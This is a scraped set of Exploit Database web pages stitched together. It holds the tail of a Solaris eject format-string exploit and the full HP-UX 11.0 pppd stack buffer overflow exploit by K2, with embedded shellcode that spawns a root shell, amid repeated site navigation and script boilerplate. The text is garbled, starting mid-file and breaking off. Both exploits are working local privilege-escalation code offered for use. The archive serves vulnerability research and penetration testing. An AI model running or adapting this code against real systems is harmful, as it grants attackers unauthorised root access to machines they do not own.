&&(value & 0xffffff00));}/* create the shell buffer */void create_shellbuf(char* shellbuf, int align, int retloc){char *ptr;int i;/* check align parameter */if (align < 0 || align > 3) {printf("Error: align is %d, it should be between 0 and 3\n", align);exit(1);}/* check retloc parameter */if (contains_zero(retloc) || contains_zero(retloc+2) ) {printf("Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\n", retloc, retloc+2);exit(1);}/* start constructing the shell buffer */ptr = shellbuf;for (i = 0; i < align; i++) {*ptr++ = 0x41;      /* alignment padding */}ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */ptr = put_long(ptr, retloc);            /* put the address of the low order half-word of the returnaddress on the stack */ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format specifier */ptr = put_long(ptr, retloc + 2);        /* put the address of the high order half-word of thereturn address on the stack *//* fill the shellbuf with NOP instructions but leave enough space for the shell code */while ((long)ptr + 4 + strlen(shellcode) + 1 < (long)shellbuf + SHELL) {ptr = put_long(ptr, NOP);}memcpy(ptr, shellcode, strlen(shellcode));      /* copy the shellcode */ptr = ptr + strlen(shellcode);/* add additional padding to the shell buffer to make sure its size is always the same */while ((long)ptr < (long)shellbuf + SHELL - 1) {*ptr++ = 0x41;}*ptr = 0;                               /* null-terminate *//* at this point the shell buffer should be exactly SHELL bytes long, including the null-terminator */if (strlen(shellbuf) + 1 != SHELL) {printf("Error: The shell buffer is %d bytes long. It should be %d bytes. Something went terribly wrong...\n",strlen(shellbuf)+1, SHELL);exit(1);}return;}/* execute the vulnerable program using our custom environment */void execute_vulnprog(char* pattern, char* shellbuf){char *env[3];FILE *fp;/* create message files */if (strlen(pattern) > 512) {printf("Warning: The pattern is %d bytes long. Only the first 512 bytes will be used.\n", strlen(pattern));}if ( !(fp = fopen("messages.po", "w+")) ) {perror("Error openning messages.po for writing.");exit(1);}fprintf(fp, "domain \"messages\"\n");fprintf(fp, "msgid  \"usage: %%s [-fndq] [name | nickname]\\n\"\n");fprintf(fp, "msgstr \"%s\\n\"", pattern);fclose(fp);system("/usr/bin/msgfmt messages.po");system("cp messages.mo SUNW_OST_OSCMD");system("cp messages.mo SUNW_OST_OSLIB");/* prepere the environment for the VULNPROG process */env[0] = "NLSPATH=:.";env[1] = shellbuf;              /* put the shellbuf in env */env[2] = NULL;                  /* end of env *//* execute the vulnerable program using our custom environment */execle(VULPROG, VULPROG, "-x", NULL, env);}/* print the program usage */void usage(char *prg){printf("Usage:\n");printf("    %s [command] [options]\n\n", prg);printf("Commands:\n");printf("  dump                   Dumps the stack\n");printf("  shell                  Dumps the shell buffer\n");printf("  exploit                Exploits /usr/bin/eject\n\n");printf("Options:\n");printf("  --num=96               Number of words to dump from the stack\n");printf("  --align=2              Sets the alignment (0, 1, 2 or 3)\n");printf("  --shellofs=-6          Offset of the shell buffer\n");printf("  --retlocofs=-4         Retloc adjustment (must be divisible by 4)\n");printf("  --retloc=0xeffffa3c    Location of the return address\n");exit(0);}/* main */main(int argc, char **argv){char shellbuf[SHELL], pattern[PATTERN], platform[256];char *ptr;long sp_addr, sh_addr, jmp_addr, reth, retl;int num = NUM, align = ALIGN, shellofs = SHELLOFS, retlocofs = RETLOCOFS, retloc = RETLOC;int i;int dump = 0, shell = 0, exploit = 0;/* read the exploit arguments */if (argc < 2) {usage(argv[0]);}if (!strncmp(argv[1], "dump", 4)) { dump = 1; }else if(!strncmp(argv[1], "shell", 5)) { shell = 1; }else if(!strncmp(argv[1], "exploit", 7)) { exploit = 1; }else {usage(argv[0]);}for (i = 2; i < argc; i++) {if ( (sscanf(argv[i], "--align=%d", &align) ||sscanf(argv[i], "--num=%d", &num) ||sscanf(argv[i], "--shellofs=%d", &shellofs) ||sscanf(argv[i], "--retlocofs=%d", &retlocofs) ||sscanf(argv[i], "--retloc=%x", &retloc))== 0) {printf("Unrecognized option %s\n\n", argv[i]);usage(argv[0]);}}/* create the shell buffer */create_shellbuf(shellbuf, align, retloc);/* calculate memory addresses */sysinfo(SI_PLATFORM, platform, 256);            /* get platform info  */sp_addr = (get_sp() | 0xffff) & 0xfffffffc;     /* get stack bottom address */sh_addr = sp_addr - (strlen(VULPROG)+1) - (strlen(platform)+1) - (strlen(shellbuf)+1) + shellofs;/* sh_add now points to the beginning of the shell buffer */printf("Calculated shell buffer address: 0x%x\n", sh_addr);if (shell == 1) {put_long(&shellbuf[align], sh_addr);        /* put sh_addr on the stack */}if ( ((sh_addr + align) & 0xfffffffc) != (sh_addr + align) ) {printf("Warning: sh_addr + align must be word aligned. Adjust shellofs and align as neccessary\n");}if (retloc == RETLOC) {                         /* if retloc was not specified on the command line, calculate it */retloc = sh_addr + align - num*4 + retlocofs;printf("Calculated retloc: 0x%x\n", retloc);put_long(&shellbuf[align+4], retloc);put_long(&shellbuf[align+12], retloc+2);}jmp_addr = (sh_addr + align) + 64;              /* Calculate the shell jump location */printf("Calculated shell code jump location: 0x%x\n\n", jmp_addr);/* create the format string */ptr = pattern;for (i = 0; i < num; i++) {memcpy(ptr, "%.8x", 4);ptr = ptr + 4;}if (dump == 1) {*ptr = 0;                                   /* null-terminate */printf("Stack dump mode, dumping %d words\n", num);}else if (shell == 1) {sprintf(ptr, " Shell buffer: %%s");printf("shellbuf (length = %d): %s\n\n", strlen(shellbuf)+1, shellbuf);printf("Shell buffer dump mode, shell buffer address is 0x%x\n", sh_addr);}else {reth = (jmp_addr >> 16) & 0xffff;retl = (jmp_addr >> 0) & 0xffff;sprintf(ptr, "%%%uc%%hn%%%uc%%hn", (reth - num * 8), (retl - reth));printf("Exploit mode, jumping to 0x%x\n", jmp_addr);}printf("num: %d\t\talign: %d\tshellofs: %d\tretlocofs: %d\tretloc: 0x%x\n\n",num, align, shellofs, retlocofs, retloc);/* execute the vulnerable program using our custom environment */execute_vulnprog(pattern, shellbuf);}// milw0rm.com [2000-11-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 198
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 199
HP-UX 11.0 - 'pppd' Local Stack Buffer Overflow - HP-UX local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDHP-UX 11.0 - 'pppd' Local Stack Buffer OverflowEDB-ID:199CVE:EDB Verified:Author:K2Type:localExploit:/Platform:HP-UXDate:2000-11-20Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*      Copyright (c) 2000 ADM                                  *//*      All Rights Reserved                                     *//*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      *//*      The copyright notice above does not evidence any        *//*      actual or intended publication of such source code.     *//*                                                              *//*      Title:        HP-UX pppd                                *//*      Tested under: HP-UX 11.0                                *//*      By:           K2                                        *//*      Use:          gcc -o pppd hp-pppd.c ; ./pppd            *//*                    (more hp to come :)                       *//*                                                              */#include <stdio.h>#include <stdlib.h>#include <sys/types.h>#include <unistd.h>#define BUF_LENGTH 22000#define STACK_OFFSET 8042#define EXTRA 3000#define HPPA_NOP 0x3902800b /* weirdo nop */u_char hppa_shellcode[] ="\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40""\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe""\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh\xff\xff";u_long get_sp(void){__asm__("copy %sp,%ret0 \n");}int main(int argc, char *argv[]){char buf[BUF_LENGTH + 8];unsigned long targ_addr;u_long *long_p;u_char *char_p;int i, code_length = strlen(hppa_shellcode),dso=STACK_OFFSET,xtra=EXTRA;if(argc > 1) dso+=atoi(argv[1]);if(argc > 2) xtra+=atoi(argv[2]);long_p = (u_long *) buf;for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)*long_p++ = HPPA_NOP;char_p = (u_char *) long_p;char_p--;  /* weirdness alighnment issue */for (i = 0; i < code_length; i++)*char_p++ = hppa_shellcode[i];targ_addr = get_sp() - dso;for (i = 0; i < xtra /4; i++){*char_p++ =(targ_addr>>24)&255;*char_p++ =(targ_addr>>16)&255;*char_p++ =(targ_addr>>8)&255;*char_p++ =(targ_addr)&255;}printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",targ_addr,strlen(buf),xtra,dso);execl("/usr/bin/pppd","pppd", buf,(char *) 0);perror("execl failed");return(-1);}// milw0rm.com [2000-11-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif 